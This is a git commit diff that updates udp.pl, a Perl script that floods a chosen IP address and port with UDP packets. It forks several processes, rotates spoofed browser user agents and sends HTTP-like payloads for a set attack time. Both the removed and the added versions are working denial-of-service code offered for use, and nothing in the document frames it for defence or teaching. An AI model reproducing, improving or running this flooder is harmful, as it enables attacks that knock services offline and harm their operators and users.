4e7285cfd95949fe21b753e99b6e08bef8fbd66f
urddos4807010 <150460739+urddos4807010@users.noreply.github.com>
2024-05-20 03:19:10 +0530

    Update udp.pl

--- udp.pl
+++ udp.pl
@@ -1,69 +1,77 @@
 #!/usr/bin/perl
 
 use strict;
+use warnings;
 use IO::Socket::INET;
 
-# Usage: perl script.pl <target_ip> <target_port> <duration_seconds> <num_threads>
-
-my $target_ip = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
-my $target_port = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
-my $duration_seconds = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
-my $num_threads = shift || die "Usage: perl $0 <target_ip> <target_port> <duration_seconds> <num_threads>\n";
-
-my $payload = "A" x 1500; # Adjust payload size as needed
-
-# User agents
-my @user_agents = (
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
-);
-
-# Prepare headers
-my $headers = "GET / HTTP/1.1\r\n";
-$headers .= "Host: $target_ip:$target_port\r\n";
-$headers .= "User-Agent: " . $user_agents[rand @user_agents] . "\r\n";
-$headers .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
-$headers .= "Accept-Language: en-US,en;q=0.5\r\n";
-$headers .= "Accept-Encoding: gzip, deflate\r\n";
-$headers .= "Connection: keep-alive\r\n";
-$headers .= "\r\n";
-
-# Flood function
-sub flood {
-    my $socket = IO::Socket::INET->new(
-        PeerAddr => $target_ip,
-        PeerPort => $target_port,
-        Proto => 'udp'
-    ) or return;
-
-    for (1 .. $duration_seconds) {
-        print $socket $payload;
-        select(undef, undef, undef, 0.001); # Adjust delay between packets
-    }
-
-    close($socket);
+# Check command-line arguments
+my $num_args = $#ARGV + 1;
+if ($num_args != 5) {
+    print "Usage: $0 <target_IP> <target_port> <attack_time> <num_threads> <payload>\n";
+    exit;
 }
 
-# Create threads
-for (1 .. $num_threads) {
+# Extract command-line arguments
+my ($target_ip, $target_port, $attack_time, $num_threads, $payload) = @ARGV;
+
+# Generate random user agents
+my @user_agents = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.254",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Vivaldi/4.0.2312.23",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Brave/91.1.25.72",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 DuckDuckGo/1.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 YandexSearch/21.6.3",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 BingBot/2.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Baiduspider/2.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Qwantify/1.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Twitter/1.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 GitHub/1.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Reddit/1.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Amazon/1.0",
+);
+
+# Generate random payloads
+my @payloads = (
+    "GET / HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
+    "GET /index.html HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
+    "GET /home HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
+    "GET /admin HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
+    # Add more payloads here if needed
+);
+
+# Attack loop
+for (1..$num_threads) {
     my $pid = fork();
     if ($pid) {
         # Parent process
+        next;
     } elsif ($pid == 0) {
         # Child process
-        flood();
-        exit(0);
+        my $start_time = time();
+        my $end_time = $start_time + $attack_time;
+        my $socket;
+        while (time() < $end_time) {
+            my $user_agent = $user_agents[int(rand(@user_agents))];
+            my $payload = $payloads[int(rand(@payloads))];
+            my $header = "GET / HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agent\r\n";
+            my $udp_socket = IO::Socket::INET->new(
+                Proto => 'udp',
+                PeerAddr => $target_ip,
+                PeerPort => $target_port,
+            ) or die "Error in socket creation: $!\n";
+            $udp_socket->send($payload);
+        }
+        exit;
     } else {
-        die "Error: Unable to fork: $!\n";
+        print "Error forking process: $!\n";
     }
 }
 
-# Wait for child processes to finish
-for (1 .. $num_threads) {
+# Wait for all child processes to finish
+for (1..$num_threads) {
     wait();
 }
 
-print "Attack complete!\n";
+print "Attack complete.\n";
